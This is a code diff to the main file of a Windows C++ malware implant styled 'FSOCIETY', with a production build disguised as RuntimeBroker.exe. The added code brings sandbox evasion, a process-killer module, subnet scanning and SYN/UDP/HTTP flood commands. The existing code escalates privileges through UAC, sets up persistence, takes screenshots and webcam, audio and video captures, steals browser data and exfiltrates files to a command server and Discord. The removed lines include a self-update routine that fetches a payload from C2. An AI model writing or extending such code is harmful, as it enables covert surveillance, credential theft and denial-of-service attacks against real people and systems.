@@ -1,19 +1,23 @@
 // ============================================================
-// FSOCIETY C++ IMPLANT — Phase 1: Core
-// Build:  g++ -o test.exe main.cpp comms.cpp shell.cpp utils.cpp -lwinhttp -static -O2
-// Prod:   g++ -o RuntimeBroker.exe main.cpp comms.cpp shell.cpp utils.cpp -lwinhttp -static -O2 -mwindows
+// FSOCIETY C++ IMPLANT — Phase 9: Mirai Evolution
+// Step 1: gcc -c sqlite3.c -o sqlite3.o -O2
+// Test:   g++ -o test.exe main.cpp comms.cpp shell.cpp utils.cpp arsenal.cpp recon.cpp killer.cpp scanner.cpp sqlite3.o -lwinhttp -lws2_32 -liphlpapi -lole32 -lcrypt32 -lbcrypt -lshlwapi -lgdi32 -lvfw32 -lwinmm -static -O2 -std=c++17
+// Prod:   g++ -o RuntimeBroker.exe main.cpp comms.cpp shell.cpp utils.cpp arsenal.cpp recon.cpp killer.cpp scanner.cpp sqlite3.o -lwinhttp -lws2_32 -liphlpapi -lole32 -lcrypt32 -lbcrypt -lshlwapi -lgdi32 -lvfw32 -lwinmm -static -O2 -std=c++17 -mwindows
 // ============================================================
 
 #include <windows.h>
 #include <shlobj.h>
 #include <string>
 #include <fstream>
+#include <sstream>
 #include "config.h"
 #include "comms.h"
 #include "shell.h"
 #include "utils.h"
 #include "recon.h"
 #include "arsenal.h"
+#include "killer.h"
+#include "scanner.h"
 
 // ===================== UAC Elevation =====================
 
@@ -45,6 +49,30 @@ static void elevate() {
     }
     // If elevation fails (user clicks No), continue without admin
     log_msg("UAC elevation declined. Running as standard user.");
+}
+
+// ===================== Anti-Analysis & Mutex =====================
+
+HANDLE persistent_mutex = nullptr;
+
+static void anti_analysis_and_mutex() {
+#if TEST_MODE
+    return;
+#endif
+
+    // 1. Mutex (Prevent Duplicates)
+    persistent_mutex = CreateMutexA(nullptr, FALSE, "Global\\FSOCIETY_MUTEX_0X99");
+    if (GetLastError() == ERROR_ALREADY_EXISTS) {
+        ExitProcess(0); // Duplicate suicide
+    }
+
+    // 2. Anti-Sandbox (Sleep evasion)
+    DWORD start_time = GetTickCount();
+    Sleep(15000); // Sleep 15 seconds
+    // If the VM fast-forwards sleep, GetTickCount difference will be tiny
+    if (GetTickCount() - start_time < 14000) {
+        ExitProcess(0); // Sandbox detected suicide
+    }
 }
 
 // ===================== Persistence =====================
@@ -139,7 +167,13 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
 #endif
     
     elevate();
+    anti_analysis_and_mutex();
     establish_persistence();
+    
+    // Phase 9: Start Killer module in background
+#if !TEST_MODE
+    killer_start();
+#endif
     
     Shell shell;
     std::string os_info = get_os_info() + " (C++)";
@@ -201,14 +235,14 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
                 else if (cmd == "ss" || cmd == "screenshot") {
                     std::string filepath = take_screenshot();
                     if (!filepath.empty()) {
-                        output = exfiltrate_file(filepath, client_id, "Screenshot from `" + client_id.substr(0,8) + "`");
+                        output = exfiltrate_file(filepath, client_id, "Screenshot from `" + client_id.substr(0,8) + "` (CMD: `" + command + "`)");
                         remove(filepath.c_str());
                     } else output = "Failed to take screenshot.";
                 }
                 else if (cmd == "wc" || cmd == "webcam") {
                     std::string filepath = take_webcam_photo();
                     if (!filepath.empty()) {
-                        output = exfiltrate_file(filepath, client_id, "Webcam capture from `" + client_id.substr(0,8) + "`");
+                        output = exfiltrate_file(filepath, client_id, "Webcam capture from `" + client_id.substr(0,8) + "` (CMD: `" + command + "`)");
                         remove(filepath.c_str());
                     } else output = "Failed to capture webcam. No device or blocked.";
                 }
@@ -220,16 +254,17 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
                         std::string args = command.substr(sp + 1);
                         size_t sp2 = args.find(' ');
                         if (sp2 != std::string::npos) {
-                            sec = std::stoi(args.substr(0, sp2));
+                            sec = std::atoi(args.substr(0, sp2).c_str());
                             mode = to_lower(args.substr(sp2 + 1));
                         } else {
-                            if (isdigit(args[0])) sec = std::stoi(args);
+                            if (isdigit(args[0])) sec = std::atoi(args.c_str());
                             else mode = to_lower(args);
                         }
+                        if (sec <= 0) sec = 10; // Fallback
                     }
                     std::string filepath = record_video(sec, mode);
                     if (!filepath.empty()) {
-                        output = exfiltrate_file(filepath, client_id, "Video (" + mode + ", " + std::to_string(sec) + "s) from `" + client_id.substr(0,8) + "`");
+                        output = exfiltrate_file(filepath, client_id, "Video (" + mode + ", " + std::to_string(sec) + "s) from `" + client_id.substr(0,8) + "` (CMD: `" + command + "`)");
                         // File removed by exfiltrate_file or manually if needed, but exfiltrate_file currently doesn't remove in C++. Let's remove it.
                         remove(filepath.c_str());
                     } else output = "Failed to record video (" + mode + ").";
@@ -242,16 +277,17 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
                         std::string args = command.substr(sp + 1);
                         size_t sp2 = args.find(' ');
                         if (sp2 != std::string::npos) {
-                            sec = std::stoi(args.substr(0, sp2));
+                            sec = std::atoi(args.substr(0, sp2).c_str());
                             if (args.find("--full") != std::string::npos) mode = "full";
                         } else {
-                            if (isdigit(args[0])) sec = std::stoi(args);
+                            if (isdigit(args[0])) sec = std::atoi(args.c_str());
                             if (args.find("--full") != std::string::npos) mode = "full";
                         }
+                        if (sec <= 0) sec = 10;
                     }
                     std::string filepath = record_av(sec, mode);
                     if (!filepath.empty()) {
-                        output = exfiltrate_file(filepath, client_id, "AV-Sync Record (" + mode + ", " + std::to_string(sec) + "s) from `" + client_id.substr(0,8) + "`");
+                        output = exfiltrate_file(filepath, client_id, "AV-Sync Record (" + mode + ", " + std::to_string(sec) + "s) from `" + client_id.substr(0,8) + "` (CMD: `" + command + "`)");
                         remove(filepath.c_str());
                     } else output = "Failed to record AV.";
                 }
@@ -290,11 +326,14 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
                 else if (cmd == "rec_a" || cmd == "record_audio") {
                     size_t sp = command.find(' ');
                     int sec = 10;
-                    if (sp != std::string::npos) sec = std::stoi(command.substr(sp + 1));
+                    if (sp != std::string::npos) {
+                        sec = std::atoi(command.substr(sp + 1).c_str());
+                        if (sec <= 0) sec = 10;
+                    }
                     
                     std::string filepath = record_audio(sec);
                     if (!filepath.empty()) {
-                        output = exfiltrate_file(filepath, client_id, "Audio recording (" + std::to_string(sec) + "s) from `" + client_id.substr(0,8) + "`");
+                        output = exfiltrate_file(filepath, client_id, "Audio recording (" + std::to_string(sec) + "s) from `" + client_id.substr(0,8) + "` (CMD: `" + command + "`)");
                         remove(filepath.c_str());
                     } else output = "Failed to record audio.";
                 }
@@ -311,7 +350,7 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
                     
                     std::string filepath = steal_browser_data(mode);
                     if (!filepath.empty()) {
-                        output = exfiltrate_file(filepath, client_id, "\xF0\x9F\x8D\xAA Browser " + mode + " from `" + client_id.substr(0,8) + "`");
+                        output = exfiltrate_file(filepath, client_id, "\xF0\x9F\x8D\xAA Browser " + mode + " from `" + client_id.substr(0,8) + "` (CMD: `" + command + "`)");
                         remove(filepath.c_str());
                     } else {
                         output = "Failed to steal browser data. No profile found or blocked.";
@@ -322,7 +361,7 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
                     if (sp != std::string::npos) {
                         std::string fpath = command.substr(sp + 1);
                         output = exfiltrate_file(fpath, client_id,
-                                    "Export: `" + fpath + "` from `" + client_id.substr(0,8) + "`");
+                                    "Export: `" + fpath + "` from `" + client_id.substr(0,8) + "` (CMD: `" + command + "`)");
                     } else {
                         output = "Error: filename required. Usage: export <filepath>";
                     }
@@ -344,30 +383,78 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
                         }
                     }
                 }
-                else if (cmd == "sys_update") {
-                    // Self-update: download new payload from C2
-                    std::string new_code = http_get("/update");
-                    if (!new_code.empty()) {
-                        char self_path[MAX_PATH];
-                        GetModuleFileNameA(nullptr, self_path, MAX_PATH);
-                        std::ofstream ofs(self_path, std::ios::binary);
-                        ofs.write(new_code.c_str(), new_code.length());
-                        ofs.close();
-                        output = "Update downloaded. Restarting...";
-                        // Report before restart
-                        http_post_json("/report/" + client_id,
-                            "{\"cmd_id\":\"" + cmd_id + "\",\"output\":\"" + json_escape(output) + "\"}");
-                        discord_send("**[Update]** `" + client_id.substr(0,8) + "` updated and restarting.");
-                        // Relaunch
-                        STARTUPINFOA si = { sizeof(si) };
-                        PROCESS_INFORMATION pi;
-                        CreateProcessA(self_path, nullptr, nullptr, nullptr,
-                                       FALSE, 0, nullptr, nullptr, &si, &pi);
-                        CloseHandle(pi.hProcess);
-                        CloseHandle(pi.hThread);
-                        ExitProcess(0);
+                // --- Phase 9: Killer Commands ---
+                else if (cmd == "killer") {
+                    size_t sp = command.find(' ');
+                    std::string sub = (sp != std::string::npos) ? to_lower(command.substr(sp + 1)) : "status";
+                    if (sub == "start") {
+                        killer_start();
+                        output = "Killer module started.";
+                    } else if (sub == "stop") {
+                        killer_stop();
+                        output = "Killer module stopped.";
                     } else {
-                        output = "No update available from C2.";
+                        output = killer_status();
+                    }
+                }
+                else if (cmd == "kill") {
+                    size_t sp = command.find(' ');
+                    if (sp != std::string::npos) {
+                        output = kill_process(command.substr(sp + 1));
+                    } else {
+                        output = "Usage: kill <process_name>";
+                    }
+                }
+                else if (cmd == "processes" || cmd == "ps") {
+                    output = list_processes();
+                }
+                // --- Phase 9: Scanner Commands ---
+                else if (cmd == "scan") {
+                    size_t sp = command.find(' ');
+                    if (sp != std::string::npos) {
+                        std::string args = command.substr(sp + 1);
+                        // scan <subnet> [ports]
+                        size_t sp2 = args.find(' ');
+                        std::string subnet = (sp2 != std::string::npos) ? args.substr(0, sp2) : args;
+                        std::string ports = (sp2 != std::string::npos) ? args.substr(sp2 + 1) : "22,23,80,135,445,3389";
+                        output = scan_subnet(subnet, ports);
+                    } else {
+                        output = scan_lan();
+                    }
+                }
+                // --- Phase 9: DDoS Attack Commands ---
+                else if (cmd == "attack") {
+                    size_t sp = command.find(' ');
+                    if (sp == std::string::npos) {
+                        output = attack_status();
+                    } else {
+                        std::string args = command.substr(sp + 1);
+                        std::string sub = to_lower(args.substr(0, args.find(' ')));
+                        
+                        if (sub == "stop") {
+                            attack_stop_all();
+                            output = "All attacks stopped.";
+                        } else if (sub == "status") {
+                            output = attack_status();
+                        } else if (sub == "syn" || sub == "udp" || sub == "http") {
+                            // Parse: attack <type> <target> [port] [duration]
+                            std::istringstream iss(args);
+                            std::string type, target;
+                            int port = 80, duration = 30;
+                            iss >> type >> target;
+                            if (target.empty()) {
+                                output = "Usage: attack <syn|udp|http> <target> [port] [duration]";
+                            } else {
+                                iss >> port >> duration;
+                                if (port <= 0) port = 80;
+                                if (duration <= 0) duration = 30;
+                                if (sub == "syn") output = attack_syn(target, port, duration);
+                                else if (sub == "udp") output = attack_udp(target, port, duration);
+                                else output = attack_http(target, duration);
+                            }
+                        } else {
+                            output = "Usage: attack <syn|udp|http|stop|status> ...";
+                        }
                     }
                 }
                 else {
